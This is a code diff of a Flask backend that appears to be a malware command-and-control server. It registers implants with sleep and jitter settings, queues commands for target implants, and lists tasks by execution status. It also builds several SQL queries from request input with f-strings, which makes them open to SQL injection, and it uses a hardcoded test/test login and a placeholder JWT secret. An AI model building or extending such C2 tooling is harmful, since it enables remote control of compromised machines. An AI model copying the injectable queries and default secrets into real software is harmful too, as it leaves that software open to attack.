@@ -3,6 +3,8 @@
 import os
 from datetime import datetime
 
+import config
+import tools
 from decouple import config
 from flask import (Flask, jsonify, make_response, redirect, render_template,
                    request, url_for)
@@ -36,22 +38,28 @@ def decrypt(ciphertext,key):
 app = Flask(__name__)
 CORS(app)
 
-host = config('host')
-password = config('password')
-username = config('username')
-port = config('thePort')
-database = config('database')
+config.host = config('host')
+config.password = config('password')
+config.username = config('username')
+config.port = config('thePort')
+config.database = config('database')
+config.clientURL = config('client')
 
 # Code taken from https://dev.to/nagatodev/how-to-add-login-authentication-to-a-flask-and-react-application-23i7
 app.config["JWT_SECRET_KEY"] = "change-me"
 app.config['CORS_HEADERS'] = 'Content-Type'
 jwt = JWTManager(app)
 
+
 @app.route('/logout', methods=["POST"])
 def logout():
-    response = jsonify({"msg": "logout success"})
-    unset_jwt_cookies(response)
-    return response
+    try:
+        response = jsonify({"msg": "logout success"})
+        unset_jwt_cookies(response)
+        return response
+    except:
+        return "couldn't logout...", 500, {'Access-Control-Allow-Origin': config.clientURL}
+
 
 @app.route('/login', methods=["POST"])
 def create_token():
@@ -63,75 +71,19 @@ def create_token():
         print(username)
         print(password)
         if username != "test" or password != "test":  # hardcoded login, TODO compare to database
-            return {"msg": "Wrong email or password"}, 401, {'Access-Control-Allow-Origin': '*'}
+            return {"msg": "Wrong email or password"}, 401, {'Access-Control-Allow-Origin': config.clientURL}
 
         access_token = create_access_token(identity=username)
         print(f"success logging in: {access_token}")
-        return ({'access_token': access_token}, 200, {'Access-Control-Allow-Origin': '*'})
+        return ({'access_token': access_token}, 200, {'Access-Control-Allow-Origin': config.clientURL})
     except Exception as error:
         print(f"error logging in: {error}")
-        return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': '*'}
-
-# Loads connection to postgresql database
-
-
-def load():
-    # Connect to C2
-    try:
-        print("Connecting")
-        conn = connect(dbname=database, user=username,
-                       password=password, host=host, port=port, connect_timeout=20)
-        print("Success? Should be 0 -> ", conn.closed)
-        cursor = conn.cursor()
-    except:
-        print("failed to connect")
-
-    print(f"Connection closed? {conn.closed}")
-    return conn, cursor
-
-
-# Executes an insert query
-def executeInsertQuery(query, variables):
-    error = None
-    try:
-        conn, cursor = load()
-        print()
-        print("executing: ")
-        print(query.as_string(cursor), variables)
-        print()
-        cursor.execute(query, variables)
-        conn.commit()
-        cursor.close()
-        conn.close()
-    except Exception as error:
-        error = error
-    finally:
-        if (error):
-            return error
-        else:
-            return None
-
-# Executes a select query
-
-
-def executeSelectQuery(query, variables):
-    conn, cursor = load()
-    print()
-    print("executing: ")
-    print(query.as_string(cursor), variables)
-    print()
-    cursor.execute(query, variables)
-    conn.commit()
-    returnThis = cursor.fetchall()
-    cursor.close()
-    conn.close()
-
-    return returnThis
+        return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}
 
 
 @app.route("/test", methods=["GET"])
 def handle_test():
-    stuff = executeInsertQuery("SELECT * from command_queue")
+    stuff = tools.executeInsertQuery("SELECT * from command_queue")
     return jsonify(stuff)
 
 
@@ -139,24 +91,8 @@ def handle_test():
 def home():
     return "<div>Hi</div>", 200
 
-# Builds a insert query, give table name and name of columns
-
-
-def insertQueryBuilder(tableName, columns):
-
-    q = sql.SQL("INSERT INTO {table}({column}) VALUES ({value})").format(
-        table=sql.Identifier(tableName),
-        column=sql.SQL(',').join([
-            sql.Identifier(x) for x in columns
-        ]),
-        value=sql.SQL(',').join(sql.Placeholder() * len(columns))
-    )
-
-    return q
 
 # api endpoint to queue a command
-
-
 @app.route("/queueCommand", methods=["POST"])
 def handle_execute():
     try:
@@ -169,55 +105,121 @@ def handle_execute():
 
         data = target_implant_id, command, created_on, status
 
-        query = insertQueryBuilder("task_queue", columns)
+        query = tools.insertQueryBuilder("task_queue", columns, ["task_id"])
         print(f"data: {data}")
-        failure = executeInsertQuery(query, data)
-        if (failure != None):
-            print(failure)
-            return "Failure executing query", 400, {'Access-Control-Allow-Origin': '*'}
-
-        response = app.response_class(
-            response="Success!",
-            status=200,
-            mimetype="application/json"
-        )
-        response.headers['Acess-Control-Allow-Origin'] = '*'
-        return response
+        db_resp = tools.executeInsertQuery(query, data)
+        print(db_resp)
+        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print(f"Failure sending commands: {error}")
-        response = app.response_class(
-            response=f"Failure! {error}",
-            status=400,
-            mimetype="application/json"
-        )
-        response.headers['Acess-Control-Allow-Origin'] = '*'
-        return response
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
-
-
-@app.route("/getCommands/<id>", methods=["GET"])
-def get_commands(id):
-    success = None
+@app.route("/get_commands", methods=["POST"])
+def get_commands():
+    data = request.json
+    id = data['id']
     try:
-        data = executeSelectQuery(
-            f"SELECT command FROM task_queue WHERE implant_id={id}")
+        db_resp = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE target_implant_id={id}")
+        print(f"this is the db response: {db_resp}")
+        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
-        print("failed to retrieve data")
+        print("failed to retrieve data on get_commands")
         print(error)
-        success = False
-        return "<div>Failure</div>"
-    finally:
-        success = True
-    if (success):
-        print(data)
-        return f"<div>success: {data}</div>"
-    else:
-        return "<div>Failure</div>"
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
+
+# List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+@app.route("/get_untouched", methods=["POST"])
+def get_untouched():
+    data = request.json
+    id = data['id']
+    try:
+        db_resp = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE target_implant_id={id} AND status=\"untouched\"")
+        print(f"this is the db response: {db_resp}")
+        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
+    except Exception as error:
+        print("failed to retrieve data on untouched")
+        print(error)
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
+
+# List executing commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+@app.route("/get_executing", methods=["POST"])
+def get_executing():
+    data = request.json
+    id = data['id']
+    try:
+        db_resp = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE target_implant_id={id} AND status=\"executing\"")
+        print(f"this is the db response: {db_resp}")
+        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
+    except Exception as error:
+        print("failed to retrieve data on get_executing")
+        print(error)
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
+
+# List executed commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+@app.route("/get_executed", methods=["POST"])
+def get_executed():
+    data = request.json
+    id = data['id']
+    try:
+        db_resp = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE target_implant_id={id} AND status=\"executed\"")
+        print(f"this is the db response: {db_resp}")
+        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
+    except Exception as error:
+        print("failed to retrieve data on get_executed")
+        print(error)
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
+
+# Register an implant, on the implant side
+@app.route("/register_implant", methods=["POST"])
+def register_implant():
+    try:
+        print("Registering Implant")
+        data = request.json
+        print(f"Recieved: {data}")
+        print(data['sleep'])
+        jitter = data['jitter']
+        sleep = data['sleep']
+        first_connection = last_seen = datetime.now().isoformat()
+        active = True
+        columns = ["first_connection", "active",
+                   "jitter", "sleep", "last_seen"]
+        values = [first_connection, active, jitter, sleep, last_seen]
+        print("Executing Query")
+        query = tools.insertQueryBuilder("implants", columns, ["implant_id"])
+        response = tools.executeInsertQuery(query, values)
+        print(f"Response: {response}")
+        return response, 200, {'Access-Control-Allow-Origin': config.clientURL}
+    except Exception as e:
+        print(f"ERROR: {e}")
+        return e, {'Access-Control-Allow-Origin': config.clientURL}
+
+# Display implants
+@app.route("/display_implants", methods=["GET"])
+def display_implants():
+    try:
+        dbResp = tools.executeSelectQuery("SELECT * FROM IMPLANTS")
+        print(dbResp)
+        return dbResp, 200, {'Access-Control-Allow-Origin': config.clientURL}
+    except Exception as e:
+        print(f"Error displaying implants: {e}")
+        return e, {'Access-Control-Allow-Origin': config.clientURL}
+
+@app.route("/response", methods=["POST"]) 
+def handle_response():
+    try: 
+        data = request.get_data()
+        
+    
+    except Exception as e:
+        print (f"Error displaying implants: {e}")
+        return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # for testing
-
-
 # def main():
 #     target_implant_id = 1
 #     command = 'some long command'
